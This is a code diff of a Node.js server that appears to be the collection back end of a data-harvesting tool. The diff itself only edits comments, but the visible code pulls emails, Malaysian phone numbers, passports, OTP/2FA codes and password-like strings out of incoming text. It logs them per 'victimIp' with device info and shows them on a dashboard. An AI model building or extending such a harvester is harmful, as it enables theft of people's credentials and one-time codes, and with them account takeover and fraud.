@@ -49,7 +49,7 @@ function extractEmails(text) {
 }
 
 // --------------------------------------------------------------
-// MALAYSIAN PATTERNS
+// FLAGGED PATTERNS
 // --------------------------------------------------------------
 function extractPhoneNumbers(text) {
     const phoneRegex = /(\+?60[-\s]?\d{1,2}[-\s]?\d{7,8}|\b01[0-9]{1,2}[-\s]?\d{7,8}\b)/g;
@@ -82,7 +82,7 @@ function extractPassport(text) {
 }
 
 // --------------------------------------------------------------
-// OTP / 2FA / PIN DETECTION (replaces BANK_ACCOUNT)
+// OTP / 2FA / PIN DETECTION 
 // --------------------------------------------------------------
 function extractOTP(text) {
     // 4-6 digit codes often after keywords like "code", "otp", "verification", "pin"
@@ -104,7 +104,7 @@ function extractOTP(text) {
 }
 
 // --------------------------------------------------------------
-// TOKENISATION & PASSWORD DETECTION (improved)
+// TOKENISATION & PASSWORD DETECTION 
 // --------------------------------------------------------------
 function splitIntoTokens(text) {
     const allowedChars = /[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};:'"\\|,.<>?/~`]+/g;
@@ -129,7 +129,7 @@ function isPasswordLike(token) {
 }
 
 // --------------------------------------------------------------
-// MAIN DETECTION FUNCTION (updated)
+// MAIN DETECTION FUNCTION
 // --------------------------------------------------------------
 function detectPatterns(rawText) {
     const text = sanitizeText(rawText);
@@ -194,7 +194,7 @@ function detectPatterns(rawText) {
 }
 
 // --------------------------------------------------------------
-// FLAGGING LOGIC (duplicate prevention – unchanged)
+// FLAGGING LOGIC (duplicate prevention)
 // --------------------------------------------------------------
 function getSensitiveHash(ip, matches) {
     const items = matches.map(m => `${m.rule}:${m.matched}`).sort().join("|");
@@ -222,7 +222,7 @@ function logFlaggedEventIfNew(victimIp, deviceInfo, matches) {
 }
 
 // --------------------------------------------------------------
-// API ENDPOINTS (unchanged)
+// API ENDPOINTS 
 // --------------------------------------------------------------
 app.get("/api/status", (req, res) => res.json({ status: "alive", timestamp: Date.now() }));
 
@@ -272,7 +272,7 @@ app.post("/api/clear-flags", (req, res) => {
 });
 
 // --------------------------------------------------------------
-// DASHBOARD UI (unchanged)
+// DASHBOARD UI 
 // --------------------------------------------------------------
 app.get("/", (req, res) => {
     let initialLogs = "No records currently indexed in data buffer.";
@@ -441,7 +441,7 @@ app.post("/", (req, res) => {
 });
 
 // --------------------------------------------------------------
-// START SERVER (ASCII art kept as you wished)
+// START SERVER
 // --------------------------------------------------------------
 app.listen(port, () => {
     console.log(`\n     dBP dBP dBBBP dBP dBP dBP    dBBBBP dBBBBb  dBBBBb  dBBBP dBBBBBb
